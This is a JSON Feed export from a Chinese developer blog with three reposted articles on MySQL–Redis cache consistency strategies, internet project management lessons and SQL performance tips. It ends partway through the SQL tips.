{
    "version": "https://jsonfeed.org/version/1",
    "title": "艾瑞可erik • All posts by \"转载\" categories",
    "description": "一只PHP开发的程序猿，偶尔做做运维、Goland、Python、Java、摄影、画画、写作、顺便睡觉，反正整站都搞过。",
    "home_page_url": "https://erik.xyz",
    "items": [
        {
            "id": "https://erik.xyz/2024/11/11/mysql-redis-consistency/",
            "url": "https://erik.xyz/2024/11/11/mysql-redis-consistency/",
            "title": "如何下保证MySQL数据库与Redis缓存数据一致性？",
            "date_published": "2024-11-11T01:58:00.000Z",
            "content_html": "<p>有时候感觉MySQL我们懂了，Redis我们懂了，但是面试的时候一直答不好，经常被难住，问题在哪呢？</p>\n<p>答案是：面试官考的不是专项能力，而是多项技术结合应用能力。</p>\n<p>就拿<strong>并发场景下如何保证MySQL与Redis缓存一致性？</strong>这个面试官常见的拷打考点举例。</p>\n<p>对于读多写少并且要求高性能的业务逻辑，我们通常在应用服务器访问MySQL数据库的中间加上一层<strong>Redis缓存层</strong>，以提高数据的查询效率，减轻MySQL数据库的压力，避免在MySQL出现性能瓶颈。<br><span id=\"more\"></span><br><img src=\"/img/2024/2024111101.png\" alt=\"https://erik.xyz\"></p>\n<p>该问题，如果在数据存储后，只读场景下是不会出现MySQL与Redis缓存的一致性问题的，所以真正需要考虑的是<strong>并发读写场景</strong>下的数据一致性问题。</p>\n<p>如果我们不加分析，单独利用MySQL和Redis的知识进行回答并发场景下如何保证MySQL与Redis缓存一致性？很难把这个问题回答好，因为看起来很简单的方案实际上是漏洞百出的。</p>\n<h4 id=\"简单方案下的漏洞百出\"><a href=\"#简单方案下的漏洞百出\" class=\"headerlink\" title=\"简单方案下的漏洞百出\"></a>简单方案下的漏洞百出</h4><p>我们先看下简单的更新数据库、删除缓存和更新缓存方案下，会出现什么问题？</p>\n<p><img src=\"/img/2024/2024111102.png\" alt=\"https://erik.xyz\"></p>\n<h4 id=\"更新缓存，再更新数据库\"><a href=\"#更新缓存，再更新数据库\" class=\"headerlink\" title=\"更新缓存，再更新数据库\"></a>更新缓存，再更新数据库</h4><p>先说结论：不考虑。</p>\n<p>原因是更新缓存成功后，数据库可能更新失败，出现数据库为旧值，缓存为新值。导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！并且当前数据库中的值为旧值，而业务数据的正确性应该以数据库的为准。</p>\n<p>那么如果更新缓存成功后，数据库可能更新失败，我们<strong>重新更新缓存</strong>是不是可以了？</p>\n<p><img src=\"/img/2024/2024111103.png\" alt=\"https://erik.xyz\"></p>\n<p>抛开需要重新更新缓存时，要单表或多表重新查询数据，再更新数据带来的性能问题，还可能期间有数据变更再次陷入脏数据的情况。实际上仍然还是会出现并发一致性问题。</p>\n<p>只要缓存进行了更新，后续的读请求<strong>在更新数据库前、更新数据库失败并准备更新缓存前</strong>，基本上都能命中缓存情况，而这时返回的数据都是未落库的脏数据。</p>\n<p><img src=\"/img/2024/2024111104.png\" alt=\"https://erik.xyz\"></p>\n<h4 id=\"更新数据库，再更新缓存\"><a href=\"#更新数据库，再更新缓存\" class=\"headerlink\" title=\"更新数据库，再更新缓存\"></a>更新数据库，再更新缓存</h4><p>不考虑。</p>\n<p>原因是当数据库更新成功后，缓存更新失败，出现数据库为最新值，缓存为旧值。导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！</p>\n<p><img src=\"/img/2024/2024111105.png\" alt=\"https://erik.xyz\"></p>\n<p>该方案就算在更新数据库、更新缓存都成功的情况下，还是会存在并发引发的一致性问题，如下图所示（点击图片查看大图）：<br><img src=\"/img/2024/2024111106.png\" alt=\"https://erik.xyz\"></p>\n<p>可以看到在并发多写多读的场景下数据存在的不一致性问题。</p>\n<h4 id=\"先删除缓存，再更新数据库\"><a href=\"#先删除缓存，再更新数据库\" class=\"headerlink\" title=\"先删除缓存，再更新数据库\"></a>先删除缓存，再更新数据库</h4><p>不考虑，但是通过使用<strong>延时双删策略</strong>后可以考虑。</p>\n<p>采用“<strong>先删除缓存，再更新数据库</strong>”的方案是一种常见的方法来尝试解决这个问题的策略。</p>\n<p>这种方法逻辑较为简单，易于理解和实现，理论上删除旧缓存后，下次读取时将从数据库获取最新数据。</p>\n<p>但在并发的极端情况下，删除缓存成功后，如果再有大量的并发请求进来，那么便会直接请求到数据库中，对数据库造成巨大的压力。而且此方案还是可能会发生数据不一致性问题。</p>\n<p><img src=\"/img/2024/2024111107.png\" alt=\"https://erik.xyz\"></p>\n<p>通过上图发现在删除缓存后，如果有并发读请求1.1进来，那么查询缓存肯定是不存在，则去读取数据库，但因为此时更新数据库x=10的操作2.更新数据库还未完成，所以读取到的仍然是旧值x=5并设置缓存后，在2.更新数据库完成后，数据是新值10，而缓存是旧值，造成了数据不一致的问题。</p>\n<p>对此我们可以先进行一波的小优化，那就是<strong>延时双删策略</strong>。即在更新数据库之后，先延迟等待一下（等待时间参考该读请求的响应时间+几十毫秒），再继续删除缓存。这样做的目的是确保读请求结束（已经在1.2读库中读取到了旧数据，后续会在该请求中更新缓存），写请求可以删除读请求造成的缓存脏数据，保证再删除缓存之后的所有读请求都能读到最新值。</p>\n<p><img src=\"/img/2024/2024111108.png\" alt=\"https://erik.xyz\"></p>\n<p>可以看出此优化方案关键点在于等待多长时间后，再次删除缓存尤为重要，但是这个时间都是根据历史查询请求的响应时间判断的，实际情况会有浮动。这也导致如果等待的延时时间过短，则仍然会出现数据不一致的情况；等待延迟时间过长，则导致延迟期间出现数据不一致的时间变长。</p>\n<p>另外<strong>延时双删策略</strong>还需要考虑如果再次删除缓存失败的情况如何处理？</p>\n<p>因为删除失败将导致后续的所有的读请求，在缓存未过期或缓存未重新正确更新的情况下，会一直保持了数据的完全不一致！这个在下文的技术优化方案继续讨论。</p>\n<h4 id=\"先更新数据库，再删除缓存\"><a href=\"#先更新数据库，再删除缓存\" class=\"headerlink\" title=\"先更新数据库，再删除缓存\"></a>先更新数据库，再删除缓存</h4><p>比较推荐。</p>\n<p>采用的“先更新数据库，再删除缓存”策略，跟“先删除缓存，再更新数据库”中我们进行<strong>延时双删策略</strong>的小优化基本一样，仍然需要考虑删除缓存失败的情况如何处理。</p>\n<p>单纯从“先更新数据库，再删除缓存”和“先删除缓存，再更新数据库”对比起来。在大多数情况下，“先更新数据库，再删除缓存”被认为是一个更好的选择，原因如下：</p>\n<p>1.<strong>数据的一致性</strong>：这种方法更倾向于保持数据的最终一致性，即使缓存删除失败，也能保证数据的一致性不会长期受损。</p>\n<p>2.<strong>用户体验</strong>：在“先删除缓存，再更新数据库”的情况下，如果数据库更新失败，用户可能会一直看到旧数据，直到缓存过期。相比之下，“先更新数据库，再删除缓存”可以在某种程度上避免这种情况。</p>\n<p>但该方案同样也会出现数据不一致性问题，如下图所示。</p>\n<p><img src=\"/img/2024/2024111109.png\" alt=\"https://erik.xyz\"></p>\n<p>当数据库的数据被更新后，缓存也被删除。接下来的出现读请求3.1和写请求3.2同时进来。</p>\n<p>读请求先读了缓存发现缓存无命中，则查询数据库并在准备更新缓存时，3.2写请求已经完成了数据的更新和删除缓存的动作，之后3.1读请求才更新了缓存。最后导致了数据库中的值未新值，缓存中的值为旧值。</p>\n<h4 id=\"优化后方案\"><a href=\"#优化后方案\" class=\"headerlink\" title=\"优化后方案\"></a>优化后方案</h4><p>从上面的简单方案方案中，似乎没有一种方案真正能解决并发场景下MySQL数据与Redis缓存数据一致性的问题。</p>\n<p>这里有个说明下，如果业务要求必须要满足<strong>强一致性</strong>，那么不管如何优化缓存策略，都无法满足，而最好的办法是不用缓存。</p>\n<p>强一致性：它要求系统写入什么，读出来的也会是什么，用户体验好，但实现起来往往对系统的性能影响大。</p>\n<p>解决方案是读写串行化，而此方案会大大增加系统的处理效率，吞吐量也会大大降低。</p>\n<p>另外在大型分布式系统中，其实分布式事务大多数情况都不会使用，因为维护成本太高了、复杂度也高。所以在分布式系统，我们一般都会推崇最终一致性，即这种一致性级别约束了系统在写入成功后，不承诺立即可以读到写入的值，也不承诺多久之后数据能够达到一致，但会尽可能地保证到某个时间级别（比如秒级别）后，数据能够达到一致状态。</p>\n<p>现在我们接着继续优化..</p>\n<h4 id=\"延迟双删策略-重试机制\"><a href=\"#延迟双删策略-重试机制\" class=\"headerlink\" title=\"延迟双删策略+重试机制\"></a>延迟双删策略+重试机制</h4><p>从上面简单方案下的漏洞百出下的先删除缓存，再更新数据库中，我们可以看出来其实<strong>延迟双删策略</strong>，算是融合“先删除缓存，再更新数据库”和“先更新数据库，再删除缓存”的策略，可以解决大部分的数据一致性的业务逻辑处理问题。</p>\n<p>但我们前面还遗留了一个待解决的问题：如果再次<strong>删除缓存失败的情况如何处理</strong>？</p>\n<p>——-当然是补救去继续删除这个缓存Key了，而补救方法则是<strong>重试</strong>。</p>\n<p><strong>重试机制</strong>可以在当前中启动新协程（Golang中属于用户态的轻量级线程）中进行重试；也可以放到消息队列中进行重试；还可以是先启动新协程重试3次，重试失败后继续放到消息队列中重试，如下图展示的是放到消息队列中进行重试。</p>\n<p>新协程中进行重试需要注意的是使用的新上下文context.Background()，而不是当前请求的上下文。</p>\n<p>一般消息队列会支持高可靠性的队列，例如 RabbitMQ、Kafka 等。这些消息队列提供了非常强的消息传递、异步处理和持久化功能，可以有效地解决数据同步的问题。</p>\n<p><img src=\"/img/2024/2024111110.png\" alt=\"https://erik.xyz\"></p>\n<p>此方案仍然存在一些需要，如：选择合适的延迟等待时间进行删除缓存；协程中重试删除缓存次数、间隔时间；消息队列中删除失败缓存失败后是否需要重试等。</p>\n<h4 id=\"读取binlog异步删除缓存\"><a href=\"#读取binlog异步删除缓存\" class=\"headerlink\" title=\"读取binlog异步删除缓存\"></a>读取binlog异步删除缓存</h4><p>重试删除缓存机制还可以吧，就是会造成好多业务代码入侵。</p>\n<p>其实，还可以这样优化：</p>\n<p>1.通过Canal将binlog日志采集发送到MQ队列来异步淘汰key。</p>\n<p>2.删除缓存的应用程序通过ACK手动机制确认处理这条更新消息，删除缓存，保证数据缓存一致性。</p>\n<p><img src=\"/img/2024/2024111111.png\" alt=\"https://erik.xyz\"></p>\n<p>异步淘汰key相比于等新对比缓存数据并更新会简单一些，因为可能一份缓存数据涉及多张表的数据查询、聚合、排序等。</p>\n<p>尽管该方案看起来也不错了，但是因为引入额外的组件（如Canal、消息队列）复杂性增加了也不少，需要维护和监控这些组件的运行状态，保证组件运行正常。</p>\n<h4 id=\"定时任务\"><a href=\"#定时任务\" class=\"headerlink\" title=\"定时任务\"></a>定时任务</h4><p>在某些业务场景的需求下，也可以通过定时任务的方式进行 Redis 和 MySQL 的数据同步。</p>\n<p>具体做法是通过定时任务从 Redis 中读取数据，然后跟 MySQL 中的数据进行比对，如果 Redis 中数据有变化，则进行同步。</p>\n<p><img src=\"/img/2024/2024111112.png\" alt=\"https://erik.xyz\"></p>\n<p>这种方式虽然实现起来比较简单，但需要注意同步的时效性，如果时间间隔设置不当，可能会导致同步的数据丢失或者不准确。</p>\n<h4 id=\"双写一致性\"><a href=\"#双写一致性\" class=\"headerlink\" title=\"双写一致性\"></a>双写一致性</h4><p>在更新数据库的同时也更新缓存/删除缓存，即所谓的“<strong>双写</strong>”。</p>\n<p>这样可以确保在数据库更新后，缓存中的数据也是最新的，从而减少数据不一致的时间窗口。</p>\n<p><img src=\"/img/2024/2024111113.png\" alt=\"https://erik.xyz\"></p>\n<p><strong>并发控制</strong>：在高并发场景下，多个请求同时对同一个数据进行更新时，如果没有妥善处理并发控制，可能会导致数据不一致的问题。所以这里引入了分布式锁和事务操作：</p>\n<p><strong>使用分布式锁</strong>：在执行双写操作之前，获取一个分布式锁（如Zookeeper、Redis的SETNX命令等），确保同一时刻只有一个线程/进程能够执行双写操作。</p>\n<p><strong>事务处理</strong>：对于支持事务的缓存系统（如Redis的MULTI/EXEC命令）和MySQL事务，可以将Redis缓存和MySQL更新操作放入事务中，确保要么全部成功，要么全部失败。</p>\n<p>当然在“双写”的策略中，除了并发控制外，可以结合上面提到的重试、定时策略进行组合，以应对极端情况下的数据不一致性问题。</p>\n<p>另外也可以处理失败的逻辑上加入告警机制，及时通知开发和运维人员。</p>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/sG7xDtLKLtlnu9ntpc5hdw\">皇子谈技术</a></p>\n",
            "tags": [
                "mysql",
                "redis",
                "数据一致性"
            ]
        },
        {
            "id": "https://erik.xyz/2024/09/22/internet-practice/",
            "url": "https://erik.xyz/2024/09/22/internet-practice/",
            "title": "史上最详细的互联网项目管理实战图解",
            "date_published": "2024-09-22T00:46:00.000Z",
            "content_html": "<p><img src=\"/img/2024/640.jpeg\" alt=\"erik.xyz\"></p>\n<p>如何系统的掌握互联网项目管理知识和经验，我搜罗世面上基本没有介绍这方面的图书，为此咱们去年年初，组织咱们前沿社区的众多大咖联合电子工业出版社出版了这本新书《互联网项目管理实战指南》希望可以助大家一臂之力！今天把文章的思维导图干货一起分享给大家！<br><span id=\"more\"></span><br><img src=\"/img/2024/640.png\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/2024/641.png\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/2024/642.png\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/2024/643.png\" alt=\"erik.xyz\"></p>\n<p><img src=\"/img/2024/644.png\" alt=\"erik.xyz\"></p>\n<p>互联网项目管理的17条经验沟通是王道 </p>\n<ul>\n<li>不论技术多么先进，没有良好的沟通机制，项目都会遇到瓶颈。确保团队成员之间有开放的沟通渠道，并且每个人都清楚自己的职责和项目的整体目标。优先级高于一切 </li>\n<li>学会区分哪些功能是必须的，哪些可以稍后添加。优先处理那些对用户来说最重要的功能。短周期发布 </li>\n<li>通过缩短发布周期，可以更快地得到用户反馈，并及时调整方向，减少资源浪费。用户反馈是金 - 始终保持与用户的联系，收集他们的反馈，并快速做出响应。这有助于产品不断改进。简化就是美 </li>\n<li>尽量简化产品的设计和功能，避免不必要的复杂性。简单易用的产品往往更受欢迎。质量控制不可忽视 </li>\n<li>在项目的每个阶段都要进行质量检查，防止小问题积累成大问题。风险管理要提前 - 对潜在的风险进行评估，并制定相应的应对策略，这样可以在问题发生前就解决它们。灵活调整计划 </li>\n<li>计划永远赶不上变化，学会在项目过程中根据实际情况调整计划是非常重要的。团队建设很重要 </li>\n<li>投资于团队建设活动，增强团队凝聚力，提高工作效率。技术选型要谨慎 </li>\n<li>在选择技术栈时要考虑长远发展，而不是仅仅因为某项技术当前流行。数据驱动决策 </li>\n<li>使用数据分析来支持产品决策，而不是仅凭直觉。重视用户体验 </li>\n<li>用户体验应该贯穿整个产品生命周期，从设计到开发再到测试，都要考虑到用户体验。持续学习与适应 </li>\n<li>技术和市场都在不断变化，持续学习新的知识和技术是必要的。文档化重要信息 </li>\n<li>确保所有的关键决策和信息都有记录，这对于新加入的团队成员来说尤其重要。健康的工作生活平衡 - 鼓励团队成员保持良好的工作生活平衡，过度劳累只会降低生产力和创新能力。持续集成/持续部署（CI/CD） </li>\n<li>实施CI/CD流程，不仅提高了代码的质量，也加速了软件的发布周期。透明度提升信任 </li>\n<li>保持项目进展的透明，定期向所有相关方汇报进度，这样可以建立信任并减少误解。</li>\n</ul>\n<p>转载自：<a href=\"https://mp.weixin.qq.com/s/kv0BAmE6ASll9eZjvlZImQ\">PMO前沿</a></p>\n",
            "tags": [
                "互联",
                "项目实战"
            ]
        },
        {
            "id": "https://erik.xyz/2024/07/22/sql-performance-optimization/",
            "url": "https://erik.xyz/2024/07/22/sql-performance-optimization/",
            "title": "SQL性能优化的47个小技巧，果断收藏！",
            "date_published": "2024-07-22T04:44:34.000Z",
            "content_html": "<p><strong>1、先了解MySQL的执行过程</strong></p>\n<p>了解了MySQL的执行过程，我们才知道如何进行sql优化。</p>\n<p>1.客户端发送一条查询语句到服务器；</p>\n<p>2.服务器先查询缓存，如果命中缓存，则立即返回存储在缓存中的数据；</p>\n<p>3.未命中缓存后，MySQL通过关键字将SQL语句进行解析，并生成一颗对应的解析树，MySQL解析器将使用MySQL语法进行验证和解析。例如，验证是否使用了错误的关键字，或者关键字的使用是否正确；</p>\n<p>4.预处理是根据一些MySQL规则检查解析树是否合理，比如检查表和列是否存在，还会解析名字和别名，然后预处理器会验证权限；</p>\n<p>5.根据执行计划查询执行引擎，调用API接口调用存储引擎来查询数据；</p>\n<p>6.将结果返回客户端，并进行缓存；<br><span id=\"more\"></span></p>\n<p><img src=\"/img/2024/202405201.png\" alt=\"erik.xyz\"></p>\n<p><strong>2、数据库常见规范</strong></p>\n<p>1.所有数据库对象名称必须使用小写字母并用下划线分割；</p>\n<p>2.所有数据库对象名称禁止使用mysql保留关键字；</p>\n<p>3.数据库对象的命名要能做到见名识意，并且最后不要超过32个字符；</p>\n<p>4.临时库表必须以tmp<em>为前缀并以日期为后缀，备份表必须以bak</em>为前缀并以日期(时间戳)为后缀；</p>\n<p>5.所有存储相同数据的列名和列类型必须一致；</p>\n<p><strong>3、所有表必须使用Innodb存储引擎</strong></p>\n<p>没有特殊要求（即Innodb无法满足的功能如：列存储，存储空间数据等）的情况下，所有表必须使用Innodb存储引擎（mysql5.5之前默认使用Myisam，5.6以后默认的为Innodb）。</p>\n<p>Innodb 支持事务，支持行级锁，更好的恢复性，高并发下性能更好。</p>\n<p><strong>4、每个Innodb表必须有个主键</strong></p>\n<p>Innodb是一种索引组织表：数据的存储的逻辑顺序和索引的顺序是相同的。每个表都可以有多个索引，但是表的存储顺序只能有一种。</p>\n<p>Innodb是按照主键索引的顺序来组织表的</p>\n<p>1.不要使用更新频繁的列作为主键，不适用多列主键；</p>\n<p>2.不要使用UUID、MD5、HASH、字符串列作为主键（无法保证数据的顺序增长）；</p>\n<p>3.主键建议使用自增ID值；</p>\n<p><strong>5、数据库和表的字符集统一使用UTF8</strong></p>\n<p>兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，不同的字符集进行比较前需要进行转换会造成索引失效，如果数据库中有存储emoji表情的需要，字符集需要采用utf8mb4字符集。</p>\n<p><strong>6、查询SQL尽量不要使用select *，而是具体字段</strong></p>\n<p>select *的弊端：</p>\n<p>1.增加很多不必要的消耗，比如CPU、IO、内存、网络带宽；</p>\n<p>2.增加了使用覆盖索引的可能性；</p>\n<p>3.增加了回表的可能性；</p>\n<p>4.当表结构发生变化时，前端也需要更改；</p>\n<p>5.查询效率低；</p>\n<p><strong>7、避免在where子句中使用 or 来连接条件</strong></p>\n<p>1.使用or可能会使索引失效，从而全表扫描；</p>\n<p>2.对于or没有索引的salary这种情况，假设它走了id的索引，但是走到salary查询条件时，它还得全表扫描；</p>\n<p>3.也就是说整个过程需要三步：全表扫描+索引扫描+合并。如果它一开始就走全表扫描，直接一遍扫描就搞定；</p>\n<p>4.虽然mysql是有优化器的，处于效率与成本考虑，遇到or条件，索引还是可能失效的；</p>\n<p><strong>8、尽量使用数值替代字符串类型</strong></p>\n<p>1.因为引擎在处理查询和连接时会逐个比较字符串中每一个字符；</p>\n<p>2.而对于数字型而言只需要比较一次就够了；</p>\n<p>3.字符会降低查询和连接的性能，并会增加存储开销；</p>\n<p><strong>9、使用varchar代替char</strong></p>\n<p>1.varchar变长字段按数据内容实际长度存储，存储空间小，可以节省存储空间；</p>\n<p>2.char按声明大小存储，不足补空格；</p>\n<p>3.其次对于查询来说，在一个相对较小的字段内搜索，效率更高；</p>\n<p><strong>10、财务、银行相关的金额字段必须使用decimal类型</strong></p>\n<ul>\n<li><p>非精准浮点：float,double</p>\n</li>\n<li><p>精准浮点：decimal</p>\n</li>\n</ul>\n<p>1.Decimal类型为精准浮点数，在计算时不会丢失精度；</p>\n<p>2.占用空间由定义的宽度决定，每4个字节可以存储9位数字，并且小数点要占用一个字节；</p>\n<p>3.可用于存储比bigint更大的整型数据；</p>\n<p><strong>11、避免使用ENUM类型</strong></p>\n<ul>\n<li><p>修改ENUM值需要使用ALTER语句；</p>\n</li>\n<li><p>ENUM类型的ORDER BY操作效率低，需要额外操作；</p>\n</li>\n<li><p>禁止使用数值作为ENUM的枚举值；</p>\n</li>\n</ul>\n<p><strong>12、去重distinct过滤字段要少</strong></p>\n<p>1.带distinct的语句占用cpu时间高于不带distinct的语句</p>\n<p>2.当查询很多字段时，如果使用distinct，数据库引擎就会对数据进行比较，过滤掉重复数据</p>\n<p>3.然而这个比较、过滤的过程会占用系统资源，如cpu时间</p>\n<p><strong>13、where中使用默认值代替null</strong></p>\n<p>1.并不是说使用了is null或者 is not null就会不走索引了，这个跟mysql版本以及查询成本都有关；</p>\n<p>2.如果mysql优化器发现，走索引比不走索引成本还要高，就会放弃索引，这些条件 !=，&lt;&gt;，is null，is not null经常被认为让索引失效；</p>\n<p>3.其实是因为一般情况下，查询的成本高，优化器自动放弃索引的；</p>\n<p>4.如果把null值，换成默认值，很多时候让走索引成为可能，同时，表达意思也相对清晰一点；</p>\n<p><strong>14、避免在where子句中使用!=或&lt;&gt;操作符</strong></p>\n<p>1.使用!=和&lt;&gt;很可能会让索引失效</p>\n<p>2.应尽量避免在where子句中使用!=或&lt;&gt;操作符，否则引擎将放弃使用索引而进行全表扫描实</p>\n<p>3.现业务优先，实在没办法，就只能使用，并不是不能使用</p>\n<p><strong>15、inner join 、left join、right join，优先使用inner join</strong></p>\n<p>三种连接如果结果相同，优先使用inner join，如果使用left join左边表尽量小。</p>\n<ul>\n<li><p>inner join 内连接，只保留两张表中完全匹配的结果集；</p>\n</li>\n<li><p>left join会返回左表所有的行，即使在右表中没有匹配的记录；</p>\n</li>\n<li><p>right join会返回右表所有的行，即使在左表中没有匹配的记录；</p>\n</li>\n</ul>\n<p>为什么？</p>\n<ul>\n<li>如果inner join是等值连接，返回的行数比较少，所以性能相对会好一点；</li>\n<li>使用了左连接，左边表数据结果尽量小，条件尽量放到左边处理，意味着返回的行数可能比较少；</li>\n<li>这是mysql优化原则，就是小表驱动大表，小的数据集驱动大的数据集，从而让性能更优；</li>\n</ul>\n<p><strong>16、提高group by语句的效率</strong></p>\n<p>1、反例</p>\n<p>先分组，再过滤<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select job, avg（salary） from employee group by jobhaving job =&#x27;develop&#x27; or job = &#x27;test&#x27;;</span><br></pre></td></tr></table></figure></p>\n<p>2、正例</p>\n<p>先过滤，后分组<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select job，avg（salary） from employee where job =&#x27;develop&#x27; or job = &#x27;test&#x27; group by job;</span><br></pre></td></tr></table></figure></p>\n<p>3、理由</p>\n<p>可以在执行到该语句前，把不需要的记录过滤掉</p>\n<p><strong>17、清空表时优先使用truncate</strong></p>\n<p>truncate table在功能上与不带 where子句的 delete语句相同：二者均删除表中的全部行。但 truncate table比 delete速度快，且使用的系统和事务日志资源少。</p>\n<p>delete语句每次删除一行，并在事务日志中为所删除的每行记录一项。truncate table通过释放存储表数据所用的数据页来删除数据，并且只在事务日志中记录页的释放。</p>\n<p>truncate table删除表中的所有行，但表结构及其列、约束、索引等保持不变。新行标识所用的计数值重置为该列的种子。如果想保留标识计数值，请改用 DELETE。如果要删除表定义及其数据，请使用 drop table语句。</p>\n<p>对于由 foreign key约束引用的表，不能使用 truncate table，而应使用不带  where子句的 DELETE 语句。由于 truncate table不记录在日志中，所以它不能激活触发器。</p>\n<p>truncate table不能用于参与了索引视图的表。</p>\n<p><strong>18、操作delete或者update语句，加个limit或者循环分批次删除</strong></p>\n<p>（1）降低写错SQL的代价</p>\n<p>清空表数据可不是小事情，一个手抖全没了，删库跑路？如果加limit，删错也只是丢失部分数据，可以通过binlog日志快速恢复的。</p>\n<p>（2）SQL效率很可能更高</p>\n<p>SQL中加了limit 1，如果第一条就命中目标return， 没有limit的话，还会继续执行扫描表。</p>\n<p>（3）避免长事务</p>\n<p>delete执行时,如果age加了索引，MySQL会将所有相关的行加写锁和间隙锁，所有执行相关行会被锁住，如果删除数量大，会直接影响相关业务无法使用。</p>\n<p>（4）数据量大的话，容易把CPU打满</p>\n<p>如果你删除数据量很大时，不加 limit限制一下记录数，容易把cpu打满，导致越删越慢。</p>\n<p>（5）锁表</p>\n<p>一次性删除太多数据，可能造成锁表，会有lock wait timeout exceed的错误，所以建议分批操作。</p>\n<p><strong>19、UNION操作符</strong></p>\n<p>UNION在进行表链接后会筛选掉重复的记录，所以在表链接后会对所产生的结果集进行排序运算，删除重复的记录再返回结果。实际大部分应用中是不会产生重复的记录，最常见的是过程表与历史表UNION。如：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select username,tel from userunionselect departmentname from department</span><br></pre></td></tr></table></figure><br>这个SQL在运行时先取出两个表的结果，再用排序空间进行排序删除重复的记录，最后返回结果集，如果表数据量大的话可能会导致用磁盘进行排序。推荐方案：采用UNION ALL操作符替代UNION，因为UNION ALL操作只是简单的将两个结果合并后就返回。</p>\n<p><strong>20、SQL语句中IN包含的字段不宜过多</strong></p>\n<p>MySQL的IN中的常量全部存储在一个数组中，这个数组是排序的。如果值过多，产生的消耗也是比较大的。如果是连续的数字，可以使用between代替，或者使用连接查询替换。</p>\n<p><strong>21、批量插入性能提升</strong></p>\n<p>（1）多条提交</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSERT INTO user (id,username) VALUES(1,&#x27;哪吒编程&#x27;);INSERT INTO user (id,username) VALUES(2,&#x27;妲己&#x27;);</span><br></pre></td></tr></table></figure>\n<p>（2）批量提交<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSERT INTO user (id,username) VALUES(1,&#x27;哪吒编程&#x27;),(2,&#x27;妲己&#x27;);</span><br></pre></td></tr></table></figure></p>\n<p>默认新增SQL有事务控制，导致每条都需要事务开启和事务提交，而批量处理是一次事务开启和提交，效率提升明显，达到一定量级，效果显著，平时看不出来。</p>\n<p><strong>22、表连接不宜太多，索引不宜太多，一般5个以内</strong></p>\n<p>（1）表连接不宜太多，一般5个以内</p>\n<p>1.关联的表个数越多，编译的时间和开销也就越大</p>\n<p>2.每次关联内存中都生成一个临时表</p>\n<p>3.应该把连接表拆开成较小的几个执行，可读性更高</p>\n<p>4.如果一定需要连接很多表才能得到数据，那么意味着这是个糟糕的设计了</p>\n<p>5.阿里规范中，建议多表联查三张表以下</p>\n<p>（2）索引不宜太多，一般5个以内</p>\n<p>1.索引并不是越多越好，虽其提高了查询的效率，但却会降低插入和更新的效率；</p>\n<p>2.索引可以理解为一个就是一张表，其可以存储数据，其数据就要占空间；</p>\n<p>3.索引表的数据是排序的，排序也是要花时间的；</p>\n<p>4.insert或update时有可能会重建索引，如果数据量巨大，重建将进行记录的重新排序，所以建索引需要慎重考虑，视具体情况来定；</p>\n<p>5.一个表的索引数最好不要超过5个，若太多需要考虑一些索引是否有存在的必要；</p>\n<p><strong>23、禁止给表中的每一列都建立单独的索引</strong></p>\n<p>真有这么干的，我也是醉了。</p>\n<p>2万字带你精通MySQL索引</p>\n<p><strong>24、如何选择索引列的顺序</strong></p>\n<p>建立索引的目的是：希望通过索引进行数据查找，减少随机IO，增加查询性能 ，索引能过滤出越少的数据，则从磁盘中读入的数据也就越少。</p>\n<p>区分度最高的放在联合索引的最左侧（区分度=列中不同值的数量/列的总行数）。</p>\n<p>尽量把字段长度小的列放在联合索引的最左侧（因为字段长度越小，一页能存储的数据量越大，IO性能也就越好）。</p>\n<p>使用最频繁的列放到联合索引的左侧（这样可以比较少的建立一些索引）。</p>\n<p><strong>25、对于频繁的查询优先考虑使用覆盖索引</strong></p>\n<p>覆盖索引：就是包含了所有查询字段(where,select,ordery by,group by包含的字段)的索引。</p>\n<p>覆盖索引的好处：</p>\n<p>（1）避免Innodb表进行索引的二次查询</p>\n<p>Innodb是以聚集索引的顺序来存储的，对于Innodb来说，二级索引在叶子节点中所保存的是行的主键信息，如果是用二级索引查询数据的话，在查找到相应的键值后，还要通过主键进行二次查询才能获取我们真实所需要的数据。</p>\n<p>而在覆盖索引中，二级索引的键值中可以获取所有的数据，避免了对主键的二次查询 ，减少了IO操作，提升了查询效率。</p>\n<p>（2）可以把随机IO变成顺序IO加快查询效率</p>\n<p>由于覆盖索引是按键值的顺序存储的，对于IO密集型的范围查找来说，对比随机从磁盘读取每一行的数据IO要少的多，因此利用覆盖索引在访问时也可以把磁盘的随机读取的IO转变成索引查找的顺序IO。</p>\n<p><strong>26、建议使用预编译语句进行数据库操作</strong></p>\n<p>预编译语句可以重复使用这些计划，减少SQL编译所需要的时间，还可以解决动态SQL所带来的SQL注入的问题。</p>\n<p>只传参数，比传递SQL语句更高效。</p>\n<p>相同语句可以一次解析，多次使用，提高处理效率。</p>\n<p><strong>27、避免产生大事务操作</strong></p>\n<p>大批量修改数据，一定是在一个事务中进行的，这就会造成表中大批量数据进行锁定，从而导致大量的阻塞，阻塞会对MySQL的性能产生非常大的影响。</p>\n<p>特别是长时间的阻塞会占满所有数据库的可用连接，这会使生产环境中的其他应用无法连接到数据库，因此一定要注意大批量写操作要进行分批。</p>\n<p><strong>28、避免在索引列上使用内置函数</strong></p>\n<p>使用索引列上内置函数，索引失效。</p>\n<p><strong>29、组合索引</strong></p>\n<p>排序时应按照组合索引中各列的顺序进行排序，即使索引中只有一个列是要排序的，否则排序性能会比较差。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 